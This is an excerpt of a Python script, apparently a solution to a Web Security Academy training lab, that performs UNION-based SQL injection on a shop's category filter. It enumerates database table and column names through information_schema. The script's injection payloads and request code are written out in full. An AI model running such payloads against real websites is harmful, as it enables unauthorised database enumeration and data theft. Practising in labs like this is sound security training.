...
Example usage:
python3 1-9-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"
"""
...
def get_tablenames():
	query = "%27+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
...
def get_columnnames(table_name):
	query = f"%27+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+=+%27{table_name}%27--"
	url = f"{host}/filter?category=Toys+%26+Games{query} HTTP/1.1"
	r = requests.request("GET", url=url, params=data)
	query_response = findthequery(r.text)
	results = findtheresults(r.text)
